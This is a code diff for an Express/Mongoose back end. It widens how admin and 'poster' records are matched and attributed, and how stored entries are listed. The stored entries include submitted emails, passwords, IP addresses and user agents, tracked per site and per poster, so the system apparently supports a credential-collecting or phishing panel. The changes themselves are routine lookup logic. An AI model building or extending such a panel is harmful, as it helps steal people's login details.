@@ -375,13 +375,15 @@ export const poster_add = async (req, res) => {
       return res.status(400).json({ error: 'User add limit reached' });
     }
 
-    const poster = await Poster.create({
+    const poster = new Poster({
       username,
       password,
       tag,
       links,
       root: user._id,
     });
+    poster.posterId = poster._id.toString();
+    await poster.save();
     user.posters.push(poster._id);
     user.numOfPosters = user.numOfPosters + 1;
     await user.save();
@@ -444,14 +446,25 @@ export const add_data = async (req, res) => {
   ).split(',')[0];
 
   try {
-    const userFound = await User.findOne({ adminId: adminId });
+    let userFound = await User.findOne({
+      $or: [
+        { adminId: adminId },
+        { username: adminId },
+        { _id: adminId && adminId.length === 24 ? adminId : null },
+      ],
+    });
 
-    const posterFound = await Poster.findOne({
+    let posterFound = await Poster.findOne({
       $or: [
         { _id: posterId && posterId.length === 24 ? posterId : null },
         { posterId: posterId },
+        { username: posterId },
       ],
     });
+
+    if (!userFound && posterFound?.root) {
+      userFound = await User.findById(posterFound.root);
+    }
 
     if (userFound && posterFound) {
       const info = await Info.create({
@@ -461,8 +474,8 @@ export const add_data = async (req, res) => {
         email,
         password,
         amount,
-        adminId: adminId,
-        poster: posterId,
+        adminId: userFound.adminId || adminId,
+        poster: posterFound.username || posterFound.posterId || posterId,
         root: posterFound._id,
         ip: ipAddress,
         agent: userAgent,
@@ -823,13 +836,34 @@ export const poster_details = async (req, res) => {
       .select('username password posterId links createdAt tag root')
       .populate('root', 'username adminId');
 
-    let query = { root: id };
+    const posterIds = [id];
+    if (poster?.posterId) posterIds.push(poster.posterId);
+    if (poster?.username) posterIds.push(poster.username);
+
+    let query = {
+      $or: [
+        { root: id },
+        { poster: { $in: posterIds } }
+      ]
+    };
     if (filter) {
-      query.$or = [
-        { site: { $regex: filter, $options: 'i' } },
-        { email: { $regex: filter, $options: 'i' } },
-        { mail: { $regex: filter, $options: 'i' } },
-      ];
+      query = {
+        $and: [
+          {
+            $or: [
+              { root: id },
+              { poster: { $in: posterIds } }
+            ]
+          },
+          {
+            $or: [
+              { site: { $regex: filter, $options: 'i' } },
+              { email: { $regex: filter, $options: 'i' } },
+              { mail: { $regex: filter, $options: 'i' } },
+            ]
+          }
+        ]
+      };
     }
 
     let sort = { createdAt: -1 };
@@ -1018,9 +1052,30 @@ export const site_exist = async (req, res) => {
     // console.log("siteFound",sitefound)
 
     if (sitefound) {
-      const adminId = sitefound.root?.root?.adminId || '';
-      const posterId =
-        sitefound.root?.posterId || sitefound.root?._id?.toString() || '';
+      let adminId = sitefound.root?.root?.adminId || sitefound.root?.adminId || '';
+      let posterId =
+        sitefound.root?.posterId || sitefound.root?.username || (sitefound.root?.root ? sitefound.root?._id?.toString() : '');
+
+      if (!adminId && sitefound.root) {
+        const posterDoc = await Poster.findById(sitefound.root._id || sitefound.root).populate('root');
+        if (posterDoc) {
+          adminId = posterDoc.root?.adminId || posterDoc.root?.username || '';
+          if (!posterId) posterId = posterDoc.posterId || posterDoc.username || posterDoc._id?.toString() || '';
+        } else {
+          const userDoc = await User.findById(sitefound.root._id || sitefound.root);
+          if (userDoc) {
+            adminId = userDoc.adminId || userDoc.username || '';
+          }
+        }
+      }
+
+      const siteamout = await Amount.findOne({ site: { $in: candidateNames } });
+      if (!posterId && siteamout?.posterId && siteamout.posterId !== 'undefined' && siteamout.posterId !== 'null') {
+        posterId = siteamout.posterId;
+      }
+      if (!adminId && siteamout?.adminId) {
+        adminId = siteamout.adminId;
+      }
 
       const clickfound = await Click.findOne({ site: siteName });
       if (clickfound) {
@@ -1135,9 +1190,30 @@ export const site_exist_two_params = async (req, res) => {
 
     if (sitefound) {
       const matchedSiteName = sitefound.linkName;
-      const adminId = sitefound.root?.root?.adminId || '';
-      const posterId =
-        sitefound.root?.posterId || sitefound.root?._id?.toString() || '';
+      let adminId = sitefound.root?.root?.adminId || sitefound.root?.adminId || '';
+      let posterId =
+        sitefound.root?.posterId || sitefound.root?.username || (sitefound.root?.root ? sitefound.root?._id?.toString() : '');
+
+      if (!adminId && sitefound.root) {
+        const posterDoc = await Poster.findById(sitefound.root._id || sitefound.root).populate('root');
+        if (posterDoc) {
+          adminId = posterDoc.root?.adminId || posterDoc.root?.username || '';
+          if (!posterId) posterId = posterDoc.posterId || posterDoc.username || posterDoc._id?.toString() || '';
+        } else {
+          const userDoc = await User.findById(sitefound.root._id || sitefound.root);
+          if (userDoc) {
+            adminId = userDoc.adminId || userDoc.username || '';
+          }
+        }
+      }
+
+      const siteamountRecord = await Amount.findOne({ site: matchedSiteName });
+      if (!posterId && siteamountRecord?.posterId && siteamountRecord.posterId !== 'undefined' && siteamountRecord.posterId !== 'null') {
+        posterId = siteamountRecord.posterId;
+      }
+      if (!adminId && siteamountRecord?.adminId) {
+        adminId = siteamountRecord.adminId;
+      }
 
       const clickfound = await Click.findOne({ site: matchedSiteName });
       if (clickfound) {
@@ -2285,7 +2361,11 @@ export const get_amount_list = async (req, res) => {
 
   try {
     const posterFound = await Poster.findOne({
-      $or: [{ posterId: id }, { _id: id && id.length === 24 ? id : null }],
+      $or: [
+        { posterId: id },
+        { _id: id && id.length === 24 ? id : null },
+        { username: id },
+      ],
     });
     let query = {};
     if (posterFound) {
@@ -2329,14 +2409,35 @@ export const get_amount_list = async (req, res) => {
       .select(
         'site email amount createdAt adminId poster root status lightningInvoice rHash'
       )
-      .populate('root', 'username')
+      .populate('root', 'username posterId')
       .sort(sort)
       .skip((page - 1) * pageSize)
-      .limit(pageSize);
+      .limit(pageSize)
+      .lean();
+
+    const populatedInfos = await Promise.all(
+      infos.map(async (info) => {
+        if (!info.root && info.poster && info.poster !== 'undefined' && info.poster !== 'null') {
+          const p = await Poster.findOne({
+            $or: [
+              { _id: info.poster.length === 24 ? info.poster : null },
+              { posterId: info.poster },
+              { username: info.poster },
+            ],
+          }).select('username posterId').lean();
+          if (p) {
+            info.root = p;
+          } else {
+            info.root = { username: info.poster, _id: info.poster };
+          }
+        }
+        return info;
+      })
+    );
 
     return res.status(200).json({
       success: true,
-      data: infos,
+      data: populatedInfos,
       total,
       page,
       pageSize,
